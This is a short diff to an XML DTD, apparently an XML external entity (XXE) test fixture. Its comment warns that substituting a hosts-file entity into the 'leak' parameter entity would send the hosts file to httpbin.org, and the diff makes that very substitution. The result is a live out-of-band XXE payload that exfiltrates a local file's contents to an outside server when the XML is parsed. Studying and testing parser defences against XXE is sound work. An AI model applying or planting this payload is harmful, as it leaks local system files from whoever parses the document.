@@ -3,7 +3,7 @@
 <!-- If you replace the value "testing" with "%hosts;" in the following
 definition of parameter entity "leak" it will send your hosts file to httpbin.org!!
 Clearly not something you want to do by accident. -->
-<!ENTITY % leak SYSTEM "https://httpbin.org/get?hello=testing">
+<!ENTITY % leak SYSTEM "https://httpbin.org/get?hello=%hosts;">
 
 <!ENTITY proof "<![CDATA[%leak;]]>">
 
